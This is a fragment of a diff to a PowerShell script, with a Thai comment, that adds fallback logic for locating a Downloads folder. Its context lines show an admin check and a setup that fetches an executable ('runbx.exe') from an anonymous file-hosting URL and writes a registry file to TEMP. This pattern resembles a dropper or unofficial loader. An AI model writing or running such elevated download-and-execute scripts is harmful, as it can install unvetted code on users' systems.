@@ -27,7 +27,21 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # -----------------------------
 # Define paths and variables
 # -----------------------------
-$downloadsPath = [Environment]::GetFolderPath("UserDownloads")
+# หาโฟลเดอร์ Downloads แบบหลายวิธี
+$downloadsPath = "$env:USERPROFILE\Downloads"
+if (-not (Test-Path $downloadsPath)) {
+    $downloadsPath = [Environment]::GetFolderPath("UserDownloads")
+}
+if (-not (Test-Path $downloadsPath)) {
+    $downloadsPath = [Environment]::GetFolderPath("MyDocuments") + "\Downloads"
+}
+if (-not (Test-Path $downloadsPath)) {
+    $downloadsPath = "C:\Downloads"
+    if (-not (Test-Path $downloadsPath)) {
+        New-Item -ItemType Directory -Path $downloadsPath -Force | Out-Null
+    }
+}
+
 $exeDestination = Join-Path $downloadsPath "runbx.exe"
 $regDestination = Join-Path $env:TEMP "titanx_reg.reg"
 $exeUrl = "https://files.catbox.moe/bt0dfp.bin"
